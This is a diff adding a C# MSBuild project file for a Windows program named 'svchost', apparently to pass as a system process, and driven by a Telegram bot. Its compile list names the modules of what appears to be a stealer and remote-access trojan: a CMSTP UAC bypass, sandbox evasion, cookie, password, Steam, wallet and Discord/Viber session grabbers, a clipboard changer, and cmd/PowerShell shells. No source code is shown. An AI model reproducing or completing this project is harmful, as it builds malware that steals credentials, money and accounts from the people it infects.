@@ -1,0 +1,113 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{E48FA94B-E31E-44F4-A88B-6B48F1016460}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>svchost</RootNamespace>
+    <AssemblyName>svchost</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <StartupObject>TelegramBot.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Data.SQLite">
+      <HintPath>..\..\аа\System.Data.SQLite.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="Telegram.Bot">
+      <HintPath>..\..\аа\Telegram.Bot.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="CMSTPBypass.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Properties\Resources.cs" />
+    <Compile Include="TelegramBot\Antibox.cs" />
+    <Compile Include="TelegramBot\Anti\DisableNotifications.cs" />
+    <Compile Include="TelegramBot\Anti\Run.cs" />
+    <Compile Include="TelegramBot\ClipboardEx.cs" />
+    <Compile Include="TelegramBot\ClipboardMonitor.cs" />
+    <Compile Include="TelegramBot\ClipChanger.cs" />
+    <Compile Include="TelegramBot\Commands.cs" />
+    <Compile Include="TelegramBot\Create.cs" />
+    <Compile Include="TelegramBot\DirectoryForUs.cs" />
+    <Compile Include="TelegramBot\DLLImport.cs" />
+    <Compile Include="TelegramBot\Enums.cs" />
+    <Compile Include="TelegramBot\FirstModel.cs" />
+    <Compile Include="TelegramBot\FirstParser.cs" />
+    <Compile Include="TelegramBot\Folders.cs" />
+    <Compile Include="TelegramBot\Func.cs" />
+    <Compile Include="TelegramBot\GrabCookie.cs" />
+    <Compile Include="TelegramBot\GrabPasswords.cs" />
+    <Compile Include="TelegramBot\GrabSteamFiles.cs" />
+    <Compile Include="TelegramBot\HomePath.cs" />
+    <Compile Include="TelegramBot\Main\Check.cs" />
+    <Compile Include="TelegramBot\Program.cs" />
+    <Compile Include="TelegramBot\Purse.cs" />
+    <Compile Include="TelegramBot\RC4.cs" />
+    <Compile Include="TelegramBot\Read.cs" />
+    <Compile Include="TelegramBot\RedirectAndBlock.cs" />
+    <Compile Include="TelegramBot\ReRun.cs" />
+    <Compile Include="TelegramBot\SafeLog.cs" />
+    <Compile Include="TelegramBot\ScrL.cs" />
+    <Compile Include="TelegramBot\SearchCookie.cs" />
+    <Compile Include="TelegramBot\SearchPasswords.cs" />
+    <Compile Include="TelegramBot\SecondModel.cs" />
+    <Compile Include="TelegramBot\SecondParser.cs" />
+    <Compile Include="TelegramBot\Session\Archive.cs" />
+    <Compile Include="TelegramBot\Session\CopyDiscordSession.cs" />
+    <Compile Include="TelegramBot\Session\CopySession.cs" />
+    <Compile Include="TelegramBot\Session\CopyViberSession.cs" />
+    <Compile Include="TelegramBot\SharpCompiller.cs" />
+    <Compile Include="TelegramBot\Shell\Cmd.cs" />
+    <Compile Include="TelegramBot\Shell\PowerShell.cs" />
+    <Compile Include="TelegramBot\Sounds.cs" />
+    <Compile Include="TelegramBot\Start.cs" />
+    <Compile Include="TelegramBot\SteamConverter.cs" />
+    <Compile Include="TelegramBot\SteamPath.cs" />
+    <Compile Include="TelegramBot\SteamProfiles.cs" />
+    <Compile Include="TelegramBot\Taskbar.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Properties\Resources.resources" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="app.manifest" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
